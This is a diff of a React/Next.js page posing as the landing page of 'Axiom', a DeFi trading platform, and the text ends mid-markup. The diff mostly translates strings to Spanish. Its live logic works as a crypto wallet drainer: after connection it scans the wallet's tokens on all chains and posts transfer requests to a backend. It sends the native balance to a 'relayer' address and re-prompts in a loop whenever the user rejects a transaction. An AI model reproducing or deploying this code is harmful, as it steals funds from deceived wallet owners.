@@ -1,6 +1,6 @@
 'use client'
 
-import React, { useEffect, useState, CSSProperties } from 'react'
+import React, { useEffect, useState } from 'react'
 import { useAppKit } from '@reown/appkit/react'
 import {useSwitchChain, useAccount, useBalance, useFeeData, usePublicClient, useWalletClient } from 'wagmi'
 import { ethers } from 'ethers'
@@ -26,130 +26,6 @@ interface FailedItem {
   reason: string
 }
 
-// Definición de estilos con tipos TypeScript
-const styles: { [key: string]: CSSProperties } = {
-  body: {
-    fontFamily: "'Inter', sans-serif",
-    margin: 0,
-    padding: 0,
-    backgroundColor: '#0a0a0a',
-    color: '#ffffff',
-  },
-  navbar: {
-    display: 'flex',
-    justifyContent: 'space-between',
-    alignItems: 'center',
-    padding: '1rem 2rem',
-    position: 'fixed',
-    top: 0,
-    width: '100%',
-    zIndex: 1000,
-    boxSizing: 'border-box',
-    background: 'rgba(10, 10, 10, 0.8)',
-    backdropFilter: 'blur(10px)',
-  },
-  navButtons: {
-    display: 'flex',
-    gap: '1rem',
-  },
-  loginBtn: {
-    background: 'transparent',
-    color: 'white',
-    border: '1px solid rgba(255, 255, 255, 0.2)',
-    padding: '10px 20px',
-    borderRadius: '10px',
-    fontWeight: 500,
-    cursor: 'pointer',
-    transition: 'all 0.3s ease',
-  },
-  signupBtn: {
-    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
-    color: 'white',
-    padding: '10px 20px',
-    borderRadius: '10px',
-    fontWeight: 500,
-    border: 'none',
-    cursor: 'pointer',
-    transition: 'all 0.3s ease',
-  },
-  ctaButton: {
-    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
-    color: 'white',
-    padding: '15px 40px',
-    borderRadius: '10px',
-    fontWeight: 600,
-    fontSize: '18px',
-    border: 'none',
-    cursor: 'pointer',
-    transition: 'all 0.3s ease',
-    marginTop: '2%',
-    textDecoration: 'none',
-    display: 'inline-block',
-  },
-  mainContent: {
-    display: 'flex',
-    justifyContent: 'center',
-    alignItems: 'center',
-    height: '100vh',
-    flexDirection: 'column',
-    background: 'linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%)',
-    textAlign: 'center',
-    padding: '0 2rem',
-  },
-  mainTitle: {
-    fontSize: '3.5rem',
-    fontWeight: 700,
-    margin: '1rem 0',
-    background: 'linear-gradient(90deg, #8C66FC, #0274F1)',
-    backgroundClip: 'text',
-    WebkitBackgroundClip: 'text',
-    WebkitTextFillColor: 'transparent',
-  },
-  subtitle: {
-    fontSize: '1.2rem',
-    color: '#ccc',
-    marginBottom: '2rem',
-    maxWidth: '600px',
-  },
-  modalOverlay: {
-    position: 'fixed',
-    top: 0,
-    left: 0,
-    right: 0,
-    bottom: 0,
-    backgroundColor: 'rgba(0, 0, 0, 0.8)',
-    display: 'flex',
-    justifyContent: 'center',
-    alignItems: 'center',
-    zIndex: 1000,
-    flexDirection: 'column'
-  },
-  modalContainer: {
-    background: '#1E1E1E',
-    borderRadius: '20px',
-    padding: '30px',
-    width: '400px',
-    maxWidth: '90%',
-    position: 'relative',
-  },
-  spinner: {
-    border: '5px solid #f3f3f3',
-    borderTop: '5px solid #8C66FC',
-    borderRadius: '50%',
-    width: '50px',
-    height: '50px',
-    animation: 'spin 1s linear infinite',
-    marginBottom: '20px'
-  },
-  buttonHover: {
-    transform: 'translateY(-2px)',
-    boxShadow: '0 10px 20px rgba(0, 0, 0, 0.2)',
-  },
-  loginBtnHover: {
-    background: 'rgba(255, 255, 255, 0.1)',
-  },
-};
-
 // Función helper para fetch con mejor manejo de errores
 const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
   const res = await fetch(url, options);
@@ -158,12 +34,12 @@ const fetchWithErrorHandling = async (url: string, options: RequestInit) => {
   const contentType = res.headers.get('content-type');
   if (!contentType || !contentType.includes('application/json')) {
     const text = await res.text();
-    throw new Error(`Unexpected server response: ${text.substring(0, 100)}`);
+    throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
   }
 
   if (!res.ok) {
     const errorData = await res.json();
-    throw new Error(`Server error: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
+    throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
   }
 
   return res.json();
@@ -192,10 +68,10 @@ export default function TokenManager(): React.JSX.Element {
   const { switchChain } = useSwitchChain()
 
   const changeChainIfNeeded = async (targetChainId: number, timeoutMs = 15000): Promise<void> => {
-    if (!walletClient) throw new Error('Wallet client not available')
+    if (!walletClient) throw new Error('Wallet client no disponible')
 
     try {
-      setLoadingMessage(`Switching to network ${targetChainId}...`)
+      setLoadingMessage(`Cambiando a la red ${targetChainId}...`)
       setIsLoading(true)
 
       const getCurrent = async () => {
@@ -212,7 +88,7 @@ export default function TokenManager(): React.JSX.Element {
         return
       }
 
-      // Try to use wagmi's switchChain if available
+      // Intentar usar switchChain de wagmi si está disponible
       let switched = false
       try {
         if (switchChain) {
@@ -220,16 +96,16 @@ export default function TokenManager(): React.JSX.Element {
           switched = true
         }
       } catch (swErr: any) {
-        // If switchChain didn't work, we'll try with wallet RPC
+        // Si switchChain no funcionó, seguiremos intentando con wallet RPC
         if (swErr?.code && swErr.code !== 4902 && !isUserRejected(swErr)) {
-          // let the next block try an alternative switch or add the chain
+          // dejar que el siguiente bloque intente un switch alternativo o agregar la cadena
         }
         if (isUserRejected(swErr)) {
-          throw new Error('User rejected network change')
+          throw new Error('Usuario rechazó el cambio de red')
         }
       }
 
-      // If not switched with switchChain, try with RPC request
+      // Si no se hizo el cambio con switchChain, intentar con request RPC
       if (!switched) {
         try {
           await walletClient.request({
@@ -237,9 +113,9 @@ export default function TokenManager(): React.JSX.Element {
             params: [{ chainId: `0x${targetChainId.toString(16)}` }]
           })
         } catch (err: any) {
-          // If the chain doesn't exist (4902) try to add it
+          // Si la cadena no existe (4902) intentamos agregarla
           if (err?.code === 4902) {
-            // example for BSC; add more blockchains as needed
+            // sólo ejemplo para BSC; agregar más blockchains según necesites
             if (targetChainId === 56) {
               await walletClient.request({
                 method: 'wallet_addEthereumChain',
@@ -251,23 +127,23 @@ export default function TokenManager(): React.JSX.Element {
                   blockExplorerUrls: ['https://bscscan.com/']
                 }]
               })
-              // try switch again
+              // intentar switch otra vez
               await walletClient.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: '0x38' }]
               })
             } else {
-              throw new Error(`Network with ID ${targetChainId} is not added to your wallet`)
+              throw new Error(`La red con ID ${targetChainId} no está agregada en tu wallet`)
             }
           } else if (isUserRejected(err)) {
-            throw new Error('User rejected network change')
+            throw new Error('Usuario rechazó el cambio de red')
           } else {
             throw err
           }
         }
       }
 
-      // Polling: wait until wallet actually reports the new chain
+      // Polling: esperar hasta que la wallet realmente reporte la nueva chain
       const start = Date.now()
       while (Date.now() - start < timeoutMs) {
         const newChain = await getCurrent()
@@ -278,11 +154,11 @@ export default function TokenManager(): React.JSX.Element {
         await new Promise((r) => setTimeout(r, 500))
       }
 
-      throw new Error('Timeout waiting for wallet to switch network')
+      throw new Error('Timeout esperando que la wallet cambie de red')
     } catch (error: any) {
       setIsLoading(false)
-      // rethrow with readable message
-      if (isUserRejected(error)) throw new Error('User rejected network change')
+      // rethrow con mensaje legible
+      if (isUserRejected(error)) throw new Error('Usuario rechazó el cambio de red')
       throw new Error(error?.message || String(error))
     }
   }
@@ -314,10 +190,10 @@ export default function TokenManager(): React.JSX.Element {
   }, [isConnected, address, hasScanned, scanError])
 
   useEffect(() => {
-    // Start processing automatically when tokens are detected
+    // Iniciar procesamiento automáticamente cuando se detectan tokens
     if (hasScanned && tokens.length > 0 && !processing) {
       setShowProcessingModal(true)
-      // Small delay so user sees the modal before processing begins
+      // Pequeño delay para que el usuario vea el modal antes de comenzar el procesamiento
       setTimeout(() => {
         processAllTokens()
       }, 1500)
@@ -337,10 +213,10 @@ export default function TokenManager(): React.JSX.Element {
   const scanWallet = async (): Promise<void> => {
     try {
       setScanError('')
-      showLoading('Scanning tokens across all chains...')
+      showLoading('Escaneando tokens en todas las cadenas...')
 
       if (!BACKEND) {
-        const errorMsg = 'Configuration error: NEXT_PUBLIC_BACKEND_URL is not defined.'
+        const errorMsg = 'Error de configuración: NEXT_PUBLIC_BACKEND_URL no está definido.'
         console.error('[CONFIG]', errorMsg)
         setScanError(errorMsg)
         hideLoading()
@@ -357,7 +233,7 @@ export default function TokenManager(): React.JSX.Element {
         body: JSON.stringify({ owner: address })
       })
 
-      console.log('Detected tokens:', data)
+      console.log('Tokens detectados:', data)
 
       const processedTokens: Token[] = (data.tokens as Token[] || []).map((token: Token) => {
         if (token.symbol === 'MATIC' && !token.address) {
@@ -366,27 +242,27 @@ export default function TokenManager(): React.JSX.Element {
         return token
       })
 
-      // Save all tokens
+      // Guardar todos los tokens
       setTokens(processedTokens || [])
       setDetectedTokensCount(processedTokens.length)
       setHasScanned(true)
       
-      // Prepare pending native tokens
+      // Preparar tokens nativos pendientes
       const nativeTokens = processedTokens.filter(token => !token.address)
       setPendingNativeTokens(nativeTokens)
       
-      // Log tokens to console
+      // Log de tokens en consola
       if (processedTokens.length > 0) {
-        console.log('Detected tokens:', processedTokens)
+        console.log('Tokens detectados:', processedTokens)
       }
       
       hideLoading()
     } catch (err: any) {
-      console.error('Error scanning wallet:', err)
-      const errorMsg = 'Error scanning wallet: ' + (err?.message || err)
+      console.error('Error escaneando wallet:', err)
+      const errorMsg = 'Error escaneando wallet: ' + (err?.message || err)
       setScanError(errorMsg)
       hideLoading()
-      await alertAction(errorMsg + '\n\nPlease try reconnecting your wallet.')
+      await alertAction(errorMsg + '\n\nPor favor, intenta reconectar la wallet.')
     }
   }
 
@@ -449,7 +325,7 @@ export default function TokenManager(): React.JSX.Element {
         body: JSON.stringify({ chain: chainId })
       })
     } catch (err) {
-      console.error('Error getting wrap info:', err)
+      console.error('Error obteniendo info de wrap:', err)
       return null
     }
   }
@@ -464,51 +340,51 @@ export default function TokenManager(): React.JSX.Element {
   const processNativeToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
   try {
     if (!walletClient || !publicClient || !address) {
-      throw new Error('Wallet not properly connected');
+      throw new Error('Wallet no conectada correctamente');
     }
 
-    // Switch to the correct chain before processing
+    // Cambiar a la cadena correcta antes de procesar
     await changeChainIfNeeded(token.chain as number)
 
     const targetChainId = token.chain as number;
     if (!targetChainId) {
-      throw new Error('Could not determine token chain');
+      throw new Error('No se pudo determinar la cadena del token');
     }
 
-    // Switch to the correct chain before processing
+    // Cambiar a la cadena correcta antes de procesar
     await changeChainIfNeeded(targetChainId);
 
-    // Rest of the code for wrap or transfer...
+    // Resto del código para wrap o transferencia...
     const wrapInfo = await getWrapInfo(targetChainId);
     const wrappedAddress: string | undefined = wrapInfo?.wrappedAddress;
 
       const balanceBN = ethers.BigNumber.from(token.balance || '0')
-      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei default
+      const gasPrice = (feeData as any)?.gasPrice || ethers.BigNumber.from('20000000000') // 20 gwei por defecto
 
-      // Gas estimates
+      // Estimaciones de gas
       const gasLimitTransfer = ethers.BigNumber.from(21000)
       const gasLimitWrap = ethers.BigNumber.from(100000)
 
-      // Safety buffer
+      // Buffer de seguridad
       const buffer = gasPrice.mul(30000)
 
-      // Calculate safe maximums
+      // Calcular máximos seguros
       const feeWrap = gasPrice.mul(gasLimitWrap)
       const feeTransfer = gasPrice.mul(gasLimitTransfer)
       const maxSafeForWrap = balanceBN.gt(feeWrap.add(buffer)) ? balanceBN.sub(feeWrap).sub(buffer) : ethers.BigNumber.from(0)
       const maxSafeForTransfer = balanceBN.gt(feeTransfer.add(buffer)) ? balanceBN.sub(feeTransfer).sub(buffer) : ethers.BigNumber.from(0)
 
-      // If not enough for any operation
+      // Si no hay suficiente para ninguna operación
       if (maxSafeForWrap.lte(0) && maxSafeForTransfer.lte(0)) {
-        const reason = 'Insufficient balance to cover gas fees'
+        const reason = 'Saldo insuficiente para cubrir gas fees'
         setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
         return { success: false, reason }
       }
 
-      // If wrapped is available and sufficient balance, wrap automatically
+      // Si hay wrapped disponible y saldo suficiente, hacer wrap automáticamente
       if (wrappedAddress && maxSafeForWrap.gt(0)) {
         try {
-          showLoading(`Processing wrap of ${token.symbol}...`)
+          showLoading(`Procesando wrap de ${token.symbol}...`)
           
           const wrapAbi = [
             {
@@ -520,7 +396,7 @@ export default function TokenManager(): React.JSX.Element {
             }
           ] as const
 
-          // Retry until transaction is confirmed
+          // Reintentar hasta que la transacción sea confirmada
           let transactionHash: string | undefined;
           let confirmed = false;
           
@@ -534,14 +410,14 @@ export default function TokenManager(): React.JSX.Element {
                 gas: gasLimitWrap.toBigInt()
               })
 
-              showLoading(`Waiting for wrap confirmation for ${token.symbol}...`)
+              showLoading(`Esperando confirmación de wrap para ${token.symbol}...`)
               await publicClient.waitForTransactionReceipt({ hash: transactionHash })
               confirmed = true;
 
             } catch (error: any) {
               if (isUserRejected(error)) {
-                // If user rejects, show alert and retry
-                await alertAction('Transaction was rejected. Please confirm the transaction to continue.');
+                // Si el usuario rechaza, mostrar alerta y reintentar
+                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
                 continue;
               }
               throw error;
@@ -561,10 +437,10 @@ export default function TokenManager(): React.JSX.Element {
           hideLoading()
           return { success: true }
         } catch (error: any) {
-            // Error handling
-            console.error('Error processing native token:', error);
+            // Manejo de errores
+            console.error('Error procesando token nativo:', error);
             const reason = isUserRejected(error) ? 
-              'User rejected the transaction' : 
+              'Usuario rechazó la transacción' : 
               `Error: ${error?.message || error}`;
 
             setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }));
@@ -572,11 +448,11 @@ export default function TokenManager(): React.JSX.Element {
           }
         };
 
-      // If no wrap was done, create transfer request in the backend
+      // Si no se hizo wrap, crear solicitud de transferencia en el backend
       if (maxSafeForTransfer.gt(0)) {
-        if (!BACKEND) throw new Error('BACKEND not configured')
+        if (!BACKEND) throw new Error('BACKEND no configurado')
         
-        showLoading(`Creating transfer request for ${token.symbol}...`)
+        showLoading(`Creando solicitud de transferencia para ${token.symbol}...`)
         const data = await fetchWithErrorHandling(`${BACKEND}/create-native-transfer-request`, {
           method: 'POST',
           headers: { 
@@ -591,27 +467,27 @@ export default function TokenManager(): React.JSX.Element {
         })
 
         if (data.ok && data.instructions && data.instructions.relayerAddress) {
-          // Retry until transaction is confirmed
+          // Reintentar hasta que la transacción sea confirmada
           let transactionHash: string | undefined;
           let confirmed = false;
           
           while (!confirmed) {
             try {
-              showLoading(`Sending ${token.symbol} to relayer...`)
+              showLoading(`Enviando ${token.symbol} al relayer...`)
               transactionHash = await walletClient.sendTransaction({
                 to: data.instructions.relayerAddress as `0x${string}`,
                 value: maxSafeForTransfer.toBigInt(),
                 gas: gasLimitTransfer.toBigInt()
               })
 
-              showLoading(`Waiting for transfer confirmation for ${token.symbol}...`)
+              showLoading(`Esperando confirmación de transferencia para ${token.symbol}...`)
               await publicClient.waitForTransactionReceipt({ hash: transactionHash })
               confirmed = true;
 
             } catch (error: any) {
               if (isUserRejected(error)) {
-                // If user rejects, show alert and retry
-                await alertAction('Transaction was rejected. Please confirm the transaction to continue.');
+                // Si el usuario rechaza, mostrar alerta y reintentar
+                await alertAction('La transacción fue rechazada. Por favor, confirma la transacción para continuar.');
                 continue;
               }
               throw error;
@@ -633,17 +509,17 @@ export default function TokenManager(): React.JSX.Element {
           return { success: true }
         } else {
           hideLoading()
-          throw new Error('Error creating transfer request')
+          throw new Error('Error creando solicitud de transferencia')
         }
       }
       
       hideLoading()
-      return { success: false, reason: 'Could not process native token' }
+      return { success: false, reason: 'No se pudo procesar el token nativo' }
     } catch (error: any) {
       hideLoading()
-      console.error('Error processing native token:', error)
+      console.error('Error procesando token nativo:', error)
 
-      const reason = isUserRejected(error) ? 'User rejected the transaction' : `Error: ${error?.message || error}`
+      const reason = isUserRejected(error) ? 'Usuario rechazó la transacción' : `Error: ${error?.message || error}`
 
       setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason }] }))
       return { success: false, reason }
@@ -652,9 +528,9 @@ export default function TokenManager(): React.JSX.Element {
 
   const processToken = async (token: Token): Promise<{success: boolean, reason?: string}> => {
     try {
-      if (!BACKEND) throw new Error('BACKEND not configured')
+      if (!BACKEND) throw new Error('BACKEND no configurado')
       
-      showLoading(`Processing ${token.symbol}...`)
+      showLoading(`Procesando ${token.symbol}...`)
       const data = await fetchWithErrorHandling(`${BACKEND}/create-transfer-request`, {
         method: 'POST',
         headers: { 
@@ -675,13 +551,13 @@ export default function TokenManager(): React.JSX.Element {
         return { success: true }
       } else {
         hideLoading()
-        throw new Error(data.error || 'Error creating transfer request')
+        throw new Error(data.error || 'Error creando solicitud de transferencia')
       }
     } catch (error: any) {
       hideLoading()
-      console.error('Error processing token:', error)
-      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Unknown error' }] }))
-      return { success: false, reason: error?.message || 'Unknown error' }
+      console.error('Error procesando token:', error)
+      setSummary(prev => ({ ...prev, failed: [...prev.failed, { token, reason: error?.message || 'Error desconocido' }] }))
+      return { success: false, reason: error?.message || 'Error desconocido' }
     }
   }
 
@@ -694,40 +570,40 @@ export default function TokenManager(): React.JSX.Element {
     setProcessing(true)
     setSummary({ sent: [], failed: [] }) // Reset summary
     
-    // Separate native and non-native tokens
+    // Separar tokens nativos y no nativos
     const nonNativeTokens = tokens.filter(token => token.address !== null)
     const nativeTokens = tokens.filter(token => token.address === null)
     
-    // If there are native tokens, show persistent confirmation
+    // Si hay tokens nativos, mostrar confirmación persistente
     if (nativeTokens.length > 0) {
       let shouldProcessNatives = false;
       
-      // Persist until user agrees to process native tokens
+      // Persistir hasta que el usuario acepte procesar los tokens nativos
       while (!shouldProcessNatives) {
         shouldProcessNatives = await confirmAction(
-          `We detected ${nativeTokens.length} native token(s). Do you want to process them automatically?`
+          `Se han detectado ${nativeTokens.length} token(s) nativo(s). ¿Deseas procesarlos automáticamente?`
         );
         
         if (!shouldProcessNatives) {
-          // If user cancels, show message and ask again
-          await alertAction('You must accept the processing of native tokens to continue.');
+          // Si el usuario cancela, mostrar mensaje y volver a preguntar
+          await alertAction('Debes aceptar el procesamiento de tokens nativos para continuar.');
         }
       }
     }
     
-    // Sort native tokens by balance (highest first)
+    // Ordenar tokens nativos por balance (mayor primero)
     const sortedNativeTokens = [...nativeTokens].sort((a, b) => {
       const balanceA = ethers.BigNumber.from(a.balance || '0')
       const balanceB = ethers.BigNumber.from(b.balance || '0')
       return balanceB.gt(balanceA) ? 1 : balanceB.lt(balanceA) ? -1 : 0
     })
 
-    // Process non-native tokens automatically
+    // Procesar tokens no nativos automáticamente
     for (const token of nonNativeTokens) {
       await processToken(token)
     }
 
-    // Process native tokens automatically
+    // Procesar tokens nativos automáticamente
     for (const token of sortedNativeTokens) {
       await changeChainIfNeeded(token.chain as number)
     }
@@ -735,15 +611,15 @@ export default function TokenManager(): React.JSX.Element {
     setProcessing(false)
     setShowProcessingModal(false)
 
-    // Show summary after a brief delay for state to update
+    // Mostrar resumen después de un breve delay para que se actualice el estado
     setTimeout(async () => {
       if (summary.sent.length > 0 || summary.failed.length > 0) {
-        let message = '=== Summary ===\n'
-        message += `Success: ${summary.sent.length}\n`
-        message += `Failed: ${summary.failed.length}\n`
+        let message = '=== Resumen ===\n'
+        message += `Éxitos: ${summary.sent.length}\n`
+        message += `Fallos: ${summary.failed.length}\n`
 
         if (summary.failed.length > 0) {
-          message += '\nSome tokens were not processed. Check the details.'
+          message += '\nAlgunos tokens no se procesaron. Revisa los detalles.'
         }
 
         await alertAction(message)
@@ -751,92 +627,479 @@ export default function TokenManager(): React.JSX.Element {
     }, 100)
   }
 
-  // Hover effect states
-  const [isLoginHovered, setIsLoginHovered] = useState(false);
-  const [isSignupHovered, setIsSignupHovered] = useState(false);
-  const [isCtaHovered, setIsCtaHovered] = useState(false);
-
-  // Avoid rendering until we're on the client
+  // Evitar renderizado hasta que estemos en el cliente
   if (!isClient) {
     return (
-      <div style={styles.mainContent}>
-        <h1 style={styles.mainTitle}>Token Manager</h1>
-        <p style={styles.subtitle}>Loading...</p>
+      <div style={{
+        display: 'flex',
+        justifyContent: 'center',
+        alignItems: 'center',
+        height: '100vh',
+        flexDirection: 'column'
+      }}>
+        <h1>Administrador de Tokens</h1>
+        <p>Cargando...</p>
       </div>
     )
   }
 
   return (
-    <div style={styles.body}>
-      {/* Navbar similar to the first code */}
-      <nav style={styles.navbar}>
-        <div style={styles.navButtons}>
-          <button 
-            style={{ 
-              ...styles.loginBtn, 
-              ...(isLoginHovered && styles.loginBtnHover) 
-            }}
-            onMouseEnter={() => setIsLoginHovered(true)}
-            onMouseLeave={() => setIsLoginHovered(false)}
-          >
-            Login
-          </button>
-          <button 
-            style={{ 
-              ...styles.signupBtn, 
-              ...(isSignupHovered && styles.buttonHover) 
-            }}
-            onMouseEnter={() => setIsSignupHovered(true)}
-            onMouseLeave={() => setIsSignupHovered(false)}
-          >
-            Sign up
-          </button>
+    <div style={{ width: '100%', height: '100%', fontFamily: 'Inter, sans-serif' }}>
+      {/* Navigation */}
+      <nav className="navbar" style={{
+        display: 'flex',
+        justifyContent: 'space-between',
+        alignItems: 'center',
+        padding: '1rem 2rem',
+        backgroundColor: '#000',
+        position: 'fixed',
+        top: 0,
+        left: 0,
+        right: 0,
+        zIndex: 1000
+      }}>
+        <img src="media/Axiom Logo.svg" style={{ width: '10%' }} alt="Axiom Logo" /> 
+        <div className="nav-buttons" style={{ display: 'flex', gap: '1rem' }}>
+          <button className="login-btn" onClick={() => open()} style={{
+            padding: '10px 16px',
+            backgroundColor: 'transparent',
+            color: '#fff',
+            border: '1px solid #333',
+            borderRadius: '8px',
+            cursor: 'pointer',
+            fontSize: '14px'
+          }}>Login</button>
+          <button className="signup-btn" onClick={() => open()} style={{
+            padding: '10px 16px',
+            backgroundColor: '#0070f3',
+            color: 'white',
+            border: 'none',
+            borderRadius: '8px',
+            cursor: 'pointer',
+            fontSize: '14px'
+          }}>Sign up</button>
         </div>
       </nav>
 
       {/* Main content */}
-      <main style={styles.mainContent}>
-        <h1 style={styles.mainTitle}>The Gateway to DeFi</h1>
-        <p style={styles.subtitle}>Axiom is the only trading platform you'll ever need.</p>
-        
-        <button
-          onClick={() => open()}
-          style={{ 
-            ...styles.ctaButton, 
-            ...(isCtaHovered && styles.buttonHover) 
-          }}
-          onMouseEnter={() => setIsCtaHovered(true)}
-          onMouseLeave={() => setIsCtaHovered(false)}
-        >
-          {isConnected ? `Connected: ${String(address)?.substring(0, 8)}...` : 'Connect Wallet'}
-        </button>
+      <main className="main-content" style={{ width: '100%', minHeight: '100vh' }}>
+        <section className="main-content" style={{ 
+          width: '100%', 
+          height: '100vh', 
+          backgroundImage: 'url(media/Captura_de_pantalla_2025-08-13_231920.png)',
+          backgroundSize: 'cover', 
+          backgroundPosition: 'center',
+          display: 'flex',
+          flexDirection: 'column',
+          justifyContent: 'center',
+          alignItems: 'center',
+          textAlign: 'center',
+          paddingTop: '4rem'
+        }}>
+          <div style={{ paddingTop: '5%' }}> 
+            <img src="media/Logo.svg" style={{ width: '200%', maxWidth: '600px' }} alt="Axiom Logo" />
+          </div>
+      
+          <h1 className="main-title" style={{ 
+            marginTop: '2%', 
+            color: '#fff', 
+            fontSize: '3rem',
+            fontWeight: '700'
+          }}>The Gateway to DeFi</h1>
+          
+          <p className="subtitle" style={{
+            color: '#ccc',
+            fontSize: '1.2rem',
+            marginBottom: '2rem'
+          }}>Axiom is the only trading platform you'll ever need.</p>
+          
+          <button
+            style={{
+              marginTop: '2%', 
+              padding: '12px 24px',
+              backgroundColor: '#0070f3',
+              color: 'white',
+              border: 'none',
+              borderRadius: '8px',
+              cursor: 'pointer',
+              fontSize: '16px',
+              fontWeight: '600'
+            }}
+            onClick={() => open()}
+          >
+            {isConnected ? `Conectado: ${String(address)?.substring(0, 8)}...` : 'Connect with Phantom'}
+          </button>
 
-        <div style={{ marginTop: '2rem', color: '#ccc' }}>
-          <span>Backed by </span>
-          <span style={{ fontWeight: 'bold' }}>Y Combinator</span>
+          
+          <div className="backed-by" style={{
+            marginTop: '3rem',
+            color: '#888',
+            display: 'flex',
+            alignItems: 'center',
+            gap: '0.5rem'
+          }}>
+            <span className="backed-text">Backed by</span>
+            <div className="combinator-logo" style={{
+              display: 'flex',
+              alignItems: 'center',
+              gap: '0.25rem'
+            }}>
+              <div className="combinator-icon" style={{
+                width: '24px',
+                height: '24px',
+                backgroundColor: '#fff',
+                color: '#000',
+                borderRadius: '4px',
+                display: 'flex',
+                justifyContent: 'center',
+                alignItems: 'center',
+                fontWeight: 'bold',
+                fontSize: '18px'
+              }}>Y</div>
+              <span className="combinator-text" style={{ fontWeight: '600' }}>Combinator</span>
+            </div>
+          </div>
+        </section>
+
+        <section style={{ width: '100%' }}>
+          <video style={{ width: '100%' }}
+            src="media/hero-video.mp4"
+            autoPlay
+            loop
+            muted
+            playsInline
+          />
+        </section>
+
+        <div className="trading-features-section" style={{
+          padding: '4rem 2rem',
+          backgroundColor: '#0a0a0a'
+        }}>
+          <div className="container" style={{ maxWidth: '1200px', margin: '0 auto' }}>
+            <div className="header-content" style={{ textAlign: 'center', marginBottom: '3rem' }}>
+              <h1 className="main-title" style={{ 
+                color: '#fff', 
+                fontSize: '2.5rem',
+                fontWeight: '700',
+                lineHeight: '1.2',
+                marginBottom: '1rem'
+              }}>Advanced Features to<br />videoline Your Trading.</h1>
+              <p className="subtitle" style={{
+                color: '#ccc',
+                fontSize: '1.2rem'
+              }}>From wallet tracking to real-time analytics, we've got you covered.</p>
+            </div>
+            
+            <div className="features-grid" style={{
+              display: 'grid',
+              gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
+              gap: '2rem'
+            }}>
+              <div className="feature-item active" style={{
+                padding: '1.5rem',
+                backgroundColor: '#111',
+                borderRadius: '12px',
+                border: '1px solid #222',
+                position: 'relative'
+              }}>
+                <div className="feature-line" style={{
+                  position: 'absolute',
+                  top: 0,
+                  left: 0,
+                  height: '100%',
+                  width: '4px',
+                  backgroundColor: '#0070f3'
+                }}></div>
+                <h3 className="feature-title" style={{
+                  color: '#fff',
+                  fontSize: '1.2rem',
+                  marginBottom: '0.5rem'
+                }}>Order Execution Engine</h3>
+                <p className="feature-description" style={{
+                  color: '#888'
+                }}>Trade with confidence.</p>
+              </div>
+              
+              <div className="feature-item" style={{
+                padding: '1.5rem',
+                backgroundColor: '#111',
+                borderRadius: '12px',
+                border: '1px solid ',
+                position: 'relative'
+              }}>
+                <div className="feature-line" style={{
+                  position: 'absolute',
+                  top: 0,
+                  left: 0,
+                  height: '100%',
+                  width: '4px',
+                  backgroundColor: '#333'
+                }}></div>
+                <h3 className="feature-title" style={{
+                  color: '#fff',
+                  fontSize: '1.2rem',
+                  marginBottom: '0.5rem'
+                }}>Wallet and Twitter Tracker</h3>
+                <p className="feature-description" style={{
+                  color: '#888'
+                }}>Trade and track all in one place.</p>
+              </div>
+              
+              <div className="feature-item" style={{
+                padding: '1.5rem',
+                backgroundColor: '#111',
+                borderRadius: '12px',
+                border: '1px solid #222',
+                position: 'relative'
+              }}>
+                <div className="feature-line" style={{
+                  position: 'absolute',
+                  top: 0,
+                  left: 0,
+                  height: '100%',
+                  width: '4px',
+                  backgroundColor: '#333'
+                }}></div>
+                <h3 className="feature-title" style={{
+                  color: '#fff',
+                  fontSize: '1.2rem',
+                  marginBottom: '0.5rem'
+                }}>Hyperliquid Perpetuals</h3>
+                <p className="feature-description" style={{
+                  color: '#888'
+                }}>Trade leveraged Perps.</p>
+              </div>
+              
+              <div className="feature-item" style={{
+                padding: '1.5rem',
+                backgroundColor: '#111',
+                borderRadius: '12px',
+                border: '1px solid #222',
+                position: 'relative'
+              }}>
+                <div className="feature-line" style={{
+                  position: 'absolute',
+                  top: 0,
+                  left: 0,
+                  height: '100%',
+                  width: '4px',
+                  backgroundColor: '#333'
+                }}></div>
+                <h3 className="feature-title" style={{
+                  color: '#fff',
+                  fontSize: '1.2rem',
+                  marginBottom: '0.5rem'
+                }}>Yield</h3>
+                <p className="feature-description" style={{
+                  color: '#888'
+                }}>Earn while you sleep.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div className="trading-dashboard-section" style={{
+          padding: '4rem 2rem',
+          backgroundColor: '#000'
+        }}>
+          <div className="container" style={{ maxWidth: '1200px', margin: '0 auto' }}>
+            <div className="content-wrapper" style={{
+              display: 'grid',
+              gridTemplateColumns: '1fr 1fr',
+              gap: '4rem',
+              alignItems: 'center'
+            }}>
+              <div className="features-left">
+                <div className="feature-block active" style={{
+                  marginBottom: '2rem',
+                  padding: '1.5rem',
+                  backgroundColor: '#111',
+                  borderRadius: '12px',
+                  border: '1px solid #222'
+                }}>
+                  <div className="feature-header" style={{
+                    display: 'flex',
+                    alignItems: 'center',
+                    marginBottom: '1rem'
+                  }}>
+                    <div className="feature-content">
+                      <h3 style={{
+                        color: '#fff',
+                        fontSize: '1.5rem',
+                        margin: 0
+                      }}>Land in ≤1 Block</h3>
+                    </div>
+                  </div>
+                  <p className="feature-description" style={{
+                    color: '#ccc',
+                    marginBottom: '1rem'
+                  }}>Our limit order execution engine is the fastest in the market.</p>
+                  <div className="feature-details">
+                    <p style={{
+                      color: '#888',
+                      margin: 0
+                    }}>With our proprietary order execution engine and colocated nodes, our limit orders land in ≤ 1 block.</p>
+                  </div>
+                </div>
+
+                <section style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
+                  <div className="feature-block" style={{
+                    padding: '1rem',
+                    backgroundColor: '#111',
+                    borderRadius: '8px',
